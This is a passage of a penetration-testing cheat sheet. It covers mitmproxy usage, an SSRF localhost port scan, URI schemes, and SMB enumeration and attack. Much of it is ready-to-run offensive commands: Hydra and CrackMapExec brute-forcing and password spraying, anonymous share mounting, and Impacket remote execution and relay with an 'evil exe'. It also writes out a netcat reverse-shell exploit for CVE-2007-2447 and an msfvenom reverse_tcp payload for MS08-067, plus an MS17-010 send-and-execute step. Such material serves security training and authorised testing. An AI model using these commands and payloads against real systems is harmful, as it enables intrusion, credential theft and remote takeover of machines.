<span class="c"># Multiple data: user=user&amp;pass=pass</span></code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--tampering--mitmproxy"> <a href="#network-enumeration--website---url--tampering--mitmproxy" class="anchor-heading" aria-labelledby="network-enumeration--website---url--tampering--mitmproxy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Mitmproxy </h4> <ul> <li><a href="https://github.com/mitmproxy/mitmproxy">Site</a> - Proxy - <a href="https://docs.mitmproxy.org/stable/overview-features/">Docs</a>/<a href="https://docs.mitmproxy.org/stable/addons-examples/">Addons</a> (<a href="https://github.com/mitmproxy/mitmproxy/blob/main/examples/contrib/xss_scanner.py">xss/sqli</a>):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Listens on port 8080 by default</span>
mitmproxy <span class="nt">--anticache</span> <span class="nt">-p</span> 8080
<span class="c"># Other mode: -m socks5/transparent</span>
<span class="c"># Use addons: -s &lt;addon.py&gt;</span>
<span class="c"># Don't verify SSL: -k</span>
<span class="c"># Client obtain SSL: http://mitm.it</span>

<span class="c"># Vi movement | Commands:</span>
f <span class="c"># Regex of captures to show/edit</span>
i <span class="c"># Regex of captures to intercept</span>
I <span class="c"># Toggle intercept</span>
v <span class="c"># Reverse capture order</span>
o <span class="c"># Set capture ordering</span>
n <span class="c"># Make new request</span>
D <span class="c"># Duplicate capture</span>
:export.clip curl @focus <span class="c"># Clipboard</span>
e <span class="c"># At mainpage view: Export to file</span>
e <span class="c"># At capture/intercept view: Edit</span>
V <span class="c"># Revert capture/intercept changes</span>
r <span class="c"># Replay capture</span>
a <span class="c"># Forward selected intercept</span>
A <span class="c"># Forward all intercepts</span>
X <span class="c"># Drop intercept</span>
d <span class="c"># Delete capture</span>
z <span class="c"># Delete all captures</span>
F <span class="c"># Focus on capture</span>
P <span class="c"># Show capture details</span>
m <span class="c"># Toggle capture mark</span>
M <span class="c"># Toggle show only marked</span>
U <span class="c"># Unset all marks</span>
Z <span class="c"># Remove not showing</span>
S <span class="c"># Start server replay</span>
E <span class="c"># Show event log</span>
- <span class="c"># Cycle layouts</span>
O <span class="c"># Change Options</span>
? <span class="c"># Help (view specific and global)</span>

<span class="c"># Capture/Intercept filter expr:</span>
~q           <span class="c"># Match Requests</span>
~c   &lt;rcode&gt; <span class="c"># Match HTTP Res Code</span>
~m   &lt;regex&gt; <span class="c"># Match HTTP Method</span>
~u   &lt;regex&gt; <span class="c"># Match URL (default)</span>
~b   &lt;regex&gt; <span class="c"># Match Req/Res body</span>
~bs  &lt;regex&gt; <span class="c"># Match Response body</span>
~h   &lt;regex&gt; <span class="c"># Match Req/Res header</span>
~hq  &lt;regex&gt; <span class="c"># Match Request header</span>
~src &lt;regex&gt; <span class="c"># Match src address</span>
~dst &lt;regex&gt; <span class="c"># Match dst address</span>
~marked      <span class="c"># Match marked Req/Res</span>
~a           <span class="c"># Match assets IMG,JS..</span>
~e           <span class="c"># Match errors</span>
~http ~tcp ~websockets <span class="c"># Match flows</span>
<span class="c"># Unary expr: ! &amp; | and: () grouping</span>

<span class="c"># For auto-regex replacement check:</span>
<span class="c"># Map Remote/Local Modify Body/Headr</span>

<span class="c"># Set/Alter headers -&gt; Options</span>
modify_headers
  /&lt;header-name&gt;/&lt;value&gt;

<span class="c"># Mitmproxy has a Python library</span></code></pre></div></div></li> <li>Export to <code>curl</code> command format and add <code>-j &lt;cookiejar&gt;</code> to get Netscape cookies</li> <li>If <a href="https://github.com/mitmproxy/mitmproxy/blob/main/examples/contrib/har_dump.py">HAR dumping</a>, use <a href="https://github.com/mrichman/hargo">Hargo</a> to process</li> <li>Use <a href="https://docs.mitmproxy.org/stable/#mitmdump">mitmdump</a> for non-interactive CLI</li> </ul> <h4 id="network-enumeration--website---url--tampering--requestify"> <a href="#network-enumeration--website---url--tampering--requestify" class="anchor-heading" aria-labelledby="network-enumeration--website---url--tampering--requestify"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Requestify </h4> <ul> <li><a href="https://github.com/ggabarrin/requestify">Site</a> - Convert Raw HTTP Request:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># To NodeJS (JSON header)</span>
requestify.py <span class="nt">-i</span> &lt;raw&gt; <span class="nt">-l</span> nodejs</code></pre></div></div></li> </ul> <h4 id="network-enumeration--website---url--tampering--rabid"> <a href="#network-enumeration--website---url--tampering--rabid" class="anchor-heading" aria-labelledby="network-enumeration--website---url--tampering--rabid"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> RABID </h4> <ul> <li><a href="https://github.com/Orange-Cyberdefense/rabid">Site</a> - RAW Cookie decoder - <a href="https://noraj.github.io/rabid/#/pages/usage?id=cli">Docs</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rabid <span class="s1">'&lt;raw-cookie&gt;'</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--website---url--ssrf"> <a href="#network-enumeration--website---url--ssrf" class="anchor-heading" aria-labelledby="network-enumeration--website---url--ssrf"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SSRF </h3> <h4 id="network-enumeration--website---url--ssrf--curl"> <a href="#network-enumeration--website---url--ssrf--curl" class="anchor-heading" aria-labelledby="network-enumeration--website---url--ssrf--curl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> curl </h4> <ul> <li>Map all open localhost TCP ports:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># GET request</span>
<span class="nb">seq </span>65535 | xargs <span class="nt">-P</span> 0 <span class="nt">-I</span><span class="o">{}</span> sh <span class="nt">-c</span> <span class="s1">'curl -m 5 -s "http://&lt;domain.port&gt;/?url=http://127.0.0.1:{}" | tr "\n" " " | sed -n "/[^ ]/{s/^/\n[+] {}:\n &amp;/;s/$/\n/p}"'</span>

<span class="c"># POST request</span>
<span class="nb">seq </span>65535 | xargs <span class="nt">-P</span> 0 <span class="nt">-I</span><span class="o">{}</span> sh <span class="nt">-c</span> <span class="s1">'curl -m 5 -s -L --data-urlencode "url=http://127.0.0.1:{}" http://&lt;domain.port&gt; | tr "\n" " " | sed -n "/[^ ]/{s/^/\n[+] {}:\n &amp;/;s/$/\n/p}"'</span></code></pre></div></div></li> </ul> <h3 id="network-enumeration--website---url--uri-schemes"> <a href="#network-enumeration--website---url--uri-schemes" class="anchor-heading" aria-labelledby="network-enumeration--website---url--uri-schemes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> URI Schemes </h3> <h4 id="network-enumeration--website---url--uri-schemes--http---https"> <a href="#network-enumeration--website---url--uri-schemes--http---https" class="anchor-heading" aria-labelledby="network-enumeration--website---url--uri-schemes--http---https"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> HTTP / HTTPS </h4> <ul> <li>May accept inline Basic Auth: <ul> <li><code>http://&lt;usr&gt;:&lt;pass&gt;@&lt;domain/ip&gt;</code></li> </ul> </li> <li>Spaces not allowed - hex-code them</li> </ul> <h4 id="network-enumeration--website---url--uri-schemes--ftp---ftps"> <a href="#network-enumeration--website---url--uri-schemes--ftp---ftps" class="anchor-heading" aria-labelledby="network-enumeration--website---url--uri-schemes--ftp---ftps"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> FTP / FTPS </h4> <ul> <li>Inline auth supported: <ul> <li><code>ftp://&lt;usr&gt;:&lt;pass&gt;@&lt;domain/ip&gt;</code></li> </ul> </li> </ul> <h4 id="network-enumeration--website---url--uri-schemes--file"> <a href="#network-enumeration--website---url--uri-schemes--file" class="anchor-heading" aria-labelledby="network-enumeration--website---url--uri-schemes--file"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> File </h4> <ul> <li>Like in the filesystem -&gt; Don&#8217;t think it follows the HTTP rules, but some implementations may vary (ex: Windows)</li> <li>You may specify a hostname: <ul> <li><code>file://&lt;host&gt;/&lt;full/path&gt;/file.txt</code></li> <li>Omitting <code>&lt;host&gt;</code> means <code>localhost</code></li> </ul> </li> <li>For Windows, the drive is necessary: <ul> <li><code>file://&lt;host&gt;/c:/&lt;path&gt;/file.txt</code></li> </ul> </li> <li>Four slash host is an alt for Win UNC: <ul> <li><code>file:////&lt;server&gt;/&lt;dir&gt;/file.txt</code></li> <li>Like <code>\\&lt;server&gt;\&lt;dir&gt;\file.txt</code></li> </ul> </li> <li>Spaces supported as is, no hex need: <ul> <li><code>file:///&lt;full/path&gt;/test file.txt</code></li> </ul> </li> </ul> <h4 id="network-enumeration--website---url--uri-schemes--data"> <a href="#network-enumeration--website---url--uri-schemes--data" class="anchor-heading" aria-labelledby="network-enumeration--website---url--uri-schemes--data"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Data </h4> <ul> <li>Plaintext or Base64, other encodings may be supported: <ul> <li><code>data://text/plain,&lt;plaintext&gt;</code></li> <li><code>data://text/plain;base64,&lt;b64text&gt;</code></li> </ul> </li> <li>Optional attributes may allow specifying a filename (<code>name</code>): <ul> <li><code>data://application/pdf;name=document.pdf;base64,&lt;b64text&gt;</code></li> </ul> </li> <li>Leading slashes might be omitted: <ul> <li><code>data:image/gif;base64,&lt;b64text&gt;</code></li> </ul> </li> </ul> <h1 id="protocols"> <a href="#protocols" class="anchor-heading" aria-labelledby="protocols"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Protocols </h1> <h2 id="protocols--smb"> <a href="#protocols--smb" class="anchor-heading" aria-labelledby="protocols--smb"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SMB </h2> <h3 id="protocols--smb--enumeration"> <a href="#protocols--smb--enumeration" class="anchor-heading" aria-labelledby="protocols--smb--enumeration"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enumeration </h3> <h4 id="protocols--smb--enumeration--nmap"> <a href="#protocols--smb--enumeration--nmap" class="anchor-heading" aria-labelledby="protocols--smb--enumeration--nmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Nmap </h4> <h5 id="protocols--smb--enumeration--nmap--safe"> <a href="#protocols--smb--enumeration--nmap--safe" class="anchor-heading" aria-labelledby="protocols--smb--enumeration--nmap--safe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Safe </h5> <ul> <li>All enums<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-p135</span>,139,445,1025 <span class="nt">-Pn</span> <span class="nt">--script</span><span class="o">=</span><span class="se">\*</span>smb<span class="se">\*</span>enum<span class="se">\*</span> &lt;ip&gt;

<span class="c"># Set a different user/pass with:</span>
<span class="c">#  --script-args=smbusername=&lt;user&gt;</span>
<span class="c"># Use a , and smbpassword=&lt;pass&gt;</span>
nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-p135</span>,139,445,1025 <span class="nt">-Pn</span> <span class="nt">--script</span><span class="o">=</span><span class="se">\*</span>smb<span class="se">\*</span>enum<span class="se">\*</span> <span class="nt">--script-args</span><span class="o">=</span><span class="nv">smbusername</span><span class="o">=</span>&lt;user&gt;,smbpassword<span class="o">=</span>&lt;pass&gt; &lt;ip&gt;</code></pre></div></div></li> <li>Proto + MBenum + OS + Security + Stat<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-p135</span>,139,445,1025 <span class="nt">-Pn</span> <span class="nt">--script</span><span class="o">=</span>smb-protocols,smb-mbenum,smb-os-discovery,smb-security-mode,smb-system-info,smb2-capabilities &lt;ip&gt;</code></pre></div></div></li> <li>Many useful scripts:<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -sS -n -sV --open -p135,139,445,1025 -Pn --script=smb-enum-domains,smb-enum-groups,smb-enum-processes,smb-enum-services,smb-enum-sessions,smb-enum-shares,smb-enum-users,smb-ls,smb-mbenum,smb-os-discovery,smb-protocols,smb-security-mode,smb-server-stats,smb-system-info,smb2-capabilities,smb2-security-mode,smb2-time &lt;ip&gt;</code></pre></div></div></li> </ul> <h5 id="protocols--smb--enumeration--nmap--unsafe"> <a href="#protocols--smb--enumeration--nmap--unsafe" class="anchor-heading" aria-labelledby="protocols--smb--enumeration--nmap--unsafe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Unsafe </h5> <ul> <li>All the previous scans can be made unsafe by setting <code>--script-args=unsafe=1</code></li> <li>Vulnerability enums:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-p135</span>,139,445,1025 <span class="nt">-Pn</span> <span class="nt">--script</span><span class="o">=</span>smb<span class="se">\*</span>vuln<span class="se">\*</span> &lt;ip&gt;</code></pre></div></div></li> <li>All &#8220;useful&#8221; SMB scans unsafe-mode:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--open</span> <span class="nt">-p</span>&lt;ports&gt; <span class="nt">-Pn</span> <span class="nt">--script</span><span class="o">=</span><span class="s1">'(smb*) and not (brute or broadcast or dos or external or fuzzer)'</span> <span class="nt">--script-args</span><span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span>1 &lt;ip&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--smb--enumeration--enum4linux"> <a href="#protocols--smb--enumeration--enum4linux" class="anchor-heading" aria-labelledby="protocols--smb--enumeration--enum4linux"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> enum4linux </h4> <ul> <li><a href="https://github.com/CiscoCXSecurity/enum4linux">Site</a> - <a href="https://github.com/cddmp/enum4linux-ng">ng-version</a> - Enum SMB info<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum4linux <span class="nt">-d</span> &lt;ip&gt;
<span class="c"># -u &lt;user&gt; | -p &lt;pass&gt;</span>

<span class="c"># Extra for DCs</span>
enum4linux <span class="nt">-d</span> <span class="nt">-a</span> <span class="nt">-l</span> &lt;ip&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--smb--enumeration--smbclient"> <a href="#protocols--smb--enumeration--smbclient" class="anchor-heading" aria-labelledby="protocols--smb--enumeration--smbclient"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> smbclient </h4> <ul> <li>First add <code>min protocol = NT1</code> or <code>SMB2</code> to the end of <code>/etc/smb.conf</code></li> <li>List services/shares:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -N for no-password</span>
<span class="c"># Change the security inline</span>
<span class="c"># --option='client min protocol=NT1'</span>
smbclient <span class="nt">-L</span> &lt;ip&gt; <span class="nt">--port</span><span class="o">=</span>&lt;alt port&gt; <span class="nt">--user</span><span class="o">=</span>&lt;optional user&gt;
<span class="c"># &lt;ip&gt; may need to be:</span>
<span class="c">#  //&lt;ip&gt;/</span>
<span class="c">#  \\\\&lt;ip&gt;\\</span></code></pre></div></div></li> <li>Connect to service:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Use -N for no-password</span>
smbclient //&lt;ip&gt;/&lt;service&gt;<span class="err">$</span>
<span class="c"># You will have more luck with those</span>
<span class="c"># that don't end in a $</span></code></pre></div></div></li> <li>Auth access to the System Volume:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-U</span> <span class="s2">"&lt;user&gt;%&lt;pass&gt;"</span> //&lt;ip&gt;/SYSVOL

<span class="nb">ls</span></code></pre></div></div></li> </ul> <h4 id="protocols--smb--enumeration--smbmap"> <a href="#protocols--smb--enumeration--smbmap" class="anchor-heading" aria-labelledby="protocols--smb--enumeration--smbmap"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> smbmap </h4> <ul> <li><a href="https://github.com/ShawnDEvans/smbmap">Site</a> - SMB enumeration tool:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-H</span> &lt;ip&gt;
<span class="c"># Wrong username required to work</span>
<span class="c"># -p &lt;passwd/ntlm&gt;</span>
<span class="c"># -x &lt;cmd&gt;       - Execute command</span>
<span class="c"># -R &lt;share&gt;     - Recursive listing</span>
<span class="c"># --upload &lt;src&gt; &lt;dst&gt;</span>
<span class="c"># --download &lt;path&gt;</span></code></pre></div></div></li> </ul> <h3 id="protocols--smb--bruteforce"> <a href="#protocols--smb--bruteforce" class="anchor-heading" aria-labelledby="protocols--smb--bruteforce"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Bruteforce </h3> <h4 id="protocols--smb--bruteforce--hydra"> <a href="#protocols--smb--bruteforce--hydra" class="anchor-heading" aria-labelledby="protocols--smb--bruteforce--hydra"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Hydra </h4> <ul> <li><a href="https://github.com/vanhauser-thc/thc-hydra">Site</a> - Multi-protocol bruteforcer:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Check hydra -U smb for more opts</span>
hydra <span class="nt">-l</span> admin <span class="nt">-P</span> &lt;dict&gt; smb://&lt;ip&gt;</code></pre></div></div></li> </ul> <h4 id="protocols--smb--bruteforce--crackmapexec"> <a href="#protocols--smb--bruteforce--crackmapexec" class="anchor-heading" aria-labelledby="protocols--smb--bruteforce--crackmapexec"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> CrackMapExec </h4> <ul> <li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a> - Swiss Army Win pentest<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Spray a password across users</span>
crackmapexec smb &lt;ip&gt; <span class="nt">-u</span> &lt;userlist&gt; <span class="nt">-p</span> &lt;passwd&gt;</code></pre></div></div></li> <li><a href="https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference">SMB reference</a></li> </ul> <h3 id="protocols--smb--mount-shares"> <a href="#protocols--smb--mount-shares" class="anchor-heading" aria-labelledby="protocols--smb--mount-shares"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Mount shares </h3> <h4 id="protocols--smb--mount-shares--mount"> <a href="#protocols--smb--mount-shares--mount" class="anchor-heading" aria-labelledby="protocols--smb--mount-shares--mount"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> mount </h4> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using SMBv1</span>
<span class="c"># Press &lt;Enter&gt; when asked for a</span>
<span class="c"># password to mount anonymously</span>
mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>1.0,username<span class="o">=</span>guest //&lt;ip&gt;/&lt;service&gt;<span class="nv">$ </span>/mnt

<span class="c"># Alternative</span>
mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>1.0,guest //&lt;ip&gt;/&lt;service&gt;<span class="nv">$ </span>/mnt
<span class="c"># You may try to pass user=&lt;name&gt;</span>
<span class="c"># to impersonate</span>

<span class="c"># Last alternative</span>
mount <span class="nt">-t</span> cifs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>1.0,sec<span class="o">=</span>none //&lt;ip&gt;/&lt;service&gt;<span class="nv">$ </span>/mnt
<span class="c"># Also try without the trailing $</span></code></pre></div></div> <h3 id="protocols--smb--ms-rpc---cve-2007-2447"> <a href="#protocols--smb--ms-rpc---cve-2007-2447" class="anchor-heading" aria-labelledby="protocols--smb--ms-rpc---cve-2007-2447"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> MS-RPC - CVE-2007-2447 </h3> <ul> <li>Affects SMB 3.0.0 &lt; 3.0.25rc3</li> <li>Anon login required to a share:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Change the security with</span>
<span class="c"># --option='client min protocol=NT1'</span>
smbclient <span class="nt">-N</span> //&lt;ip&gt;/&lt;share&gt;

<span class="c"># logon command must be available</span>
<span class="nb">help</span>

<span class="c"># Spawn a reverse shell</span>
logon <span class="s2">"./=</span><span class="sb">`</span><span class="nb">nohup </span>nc <span class="nt">-n</span> &lt;ip&gt; &lt;port&gt; <span class="nt">-e</span> /bin/sh<span class="sb">`</span><span class="s2">"</span>
<span class="c"># Fallback to $() and single quotes</span></code></pre></div></div></li> <li>There&#8217;s also <a href="https://github.com/amriunix/CVE-2007-2447">this Python implementation</a></li> </ul> <h3 id="protocols--smb--ms08-067"> <a href="#protocols--smb--ms08-067" class="anchor-heading" aria-labelledby="protocols--smb--ms08-067"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> MS08-067 </h3> <ul> <li>Use <a href="https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py">ms08-067.py</a></li> <li>Replace the payload with <code>msfvenom</code>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;ip&gt; <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nv">EXITFUNC</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00</span><span class="se">\x</span><span class="s2">0a</span><span class="se">\x</span><span class="s2">0d</span><span class="se">\x</span><span class="s2">5c</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">2e</span><span class="se">\x</span><span class="s2">40"</span> <span class="nt">-f</span> py <span class="nt">-v</span> shellcode</code></pre></div></div></li> <li>Run it:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 ms08-067.py &lt;ip&gt; &lt;os-type&gt; &lt;port&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--smb--ms17-010"> <a href="#protocols--smb--ms17-010" class="anchor-heading" aria-labelledby="protocols--smb--ms17-010"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> MS17-010 </h3> <ul> <li>Modify the Python scripts for just sending files after obtaining a shell (search and comment the <code>service_exec</code> function call)</li> <li><b>IMPORTANT:</b> The scripts may fail if using blank credentials, whereas they won&#8217;t with the wrong ones (see <code>smbmap</code>)</li> <li><a href="https://github.com/helviojunior/MS17-010">helviojunior/MS17-010</a> <ul> <li>Win XP - Send and run executables:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Modify USERNAME if needed</span>
python2 send_and_execute.py &lt;ip&gt; &lt;shell.exe&gt;</code></pre></div></div></li> </ul> </li> <li><a href="https://github.com/3ndG4me/AutoBlue-MS17-010">3ndG4me/AutoBlue-MS17-010</a> <ul> <li>Modern scripts but no XP exploitation</li> <li>Best pipe finder (works in XP):<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 eternal_checker.py &lt;ip&gt;</code></pre></div></div></li> </ul> </li> </ul> <h3 id="protocols--smb--printerbug-py"> <a href="#protocols--smb--printerbug-py" class="anchor-heading" aria-labelledby="protocols--smb--printerbug-py"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> printerbug.py </h3> <ul> <li><a href="https://github.com/dirkjanm/krbrelayx">Site</a> - Auth -&gt; SpoolService bug via SMB<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Force auth with attacker: responder</span>
printerbug.py <span class="o">[[</span>&lt;dom&gt;/]&lt;user&gt;[:&lt;pass&gt;]@]&lt;host/ip&gt; &lt;attacker-ip&gt;</code></pre></div></div></li> </ul> <h3 id="protocols--smb--impacket"> <a href="#protocols--smb--impacket" class="anchor-heading" aria-labelledby="protocols--smb--impacket"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Impacket </h3> <h4 id="protocols--smb--impacket--psexec"> <a href="#protocols--smb--impacket--psexec" class="anchor-heading" aria-labelledby="protocols--smb--impacket--psexec"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> PSEXEC </h4> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a> - SMB upload &amp; exec bin: cmd<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># By default runs cmd.exe</span>
psexec <span class="s1">'[dom/]&lt;user&gt;[:&lt;pass&gt;]@&lt;ip&gt;'</span>
<span class="c"># -no-pass</span>
<span class="c"># -hashes &lt;LM&gt;:&lt;NT&gt; - NTLM auth</span>
<span class="c"># -k                - Kerberos auth</span></code></pre></div></div></li> </ul> <h4 id="protocols--smb--impacket--smbserver"> <a href="#protocols--smb--impacket--smbserver" class="anchor-heading" aria-labelledby="protocols--smb--impacket--smbserver"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SMBserver </h4> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py">smbserver.py</a> - Share a path over SMB:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># sudo required for port 445 binding</span>
<span class="nb">sudo </span>smbserver.py share <span class="nb">.</span>
<span class="c"># Modern need: -smb2support for SMB2</span></code></pre></div></div></li> <li>Download/Upload files from Windows:<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">:: Download</span>
<span class="nb">copy</span> \\&lt;ip&gt;\share\&lt;remote<span class="na">-file</span><span class="o">&gt;</span> .

<span class="c">:: Upload</span>
<span class="nb">copy</span> <span class="o">&lt;</span><span class="kd">local</span><span class="na">-file</span><span class="o">&gt;</span> \\&lt;ip&gt;\share\</code></pre></div></div></li> </ul> <h4 id="protocols--smb--impacket--smbrelayx"> <a href="#protocols--smb--impacket--smbrelayx" class="anchor-heading" aria-labelledby="protocols--smb--impacket--smbrelayx"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> SMBrelayx </h4> <ul> <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py">smbrelayx.py</a> - Serve payload on conn:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Send evil exe to victims</span>
smbrelayx.py <span class="nt">-h</span> &lt;ip&gt; <span class="nt">-e</span> &lt;evil-exe&gt;
<span class="c"># The evil exe will be executed</span></code></pre></div></div></li> </ul> <h3 id="protocols--smb--winexe"> <a href="#protocols--smb--winexe" class="anchor-heading" aria-labelledby="protocols--smb--winexe"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> winexe </h3> <ul> <li><a href="https://gitlab.com/kalilinux/packages/winexe">Site</a> - Execute commands remotely on Windows NT/2000/XP/2003 - winexe serv:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winexe <span class="nt">-U</span> <span class="s1">'Administrator%&lt;pass&gt;'</span> //&lt;ip&gt; <span class="s1">'cmd.exe'</span></code></pre></div></div></li> </ul> <h3 id="protocols--smb--metasploit"> <a href="#protocols--smb--metasploit" class="anchor-heading" aria-labelledby="protocols--smb--metasploit"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Metasploit </h3> <ul> <li>There may be some issues with the SMB modules, try the <a href="https://github.com/rapid7/metasploit-framework/issues/13977#issuecomment-705066743">proposed fixes</a>:<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>SMBUser &lt;user&gt;
<span class="nb">set </span>SMBPass &lt;password&gt;
<span class="nb">set </span>SMB_SHARE_NAME &lt;writable_folder&gt;
<span class="nb">set </span>SMB::AlwaysEncrypt <span class="nb">false
set </span>SMB::ProtocolVersion 2,3
<span class="c"># Or proto 1</span>
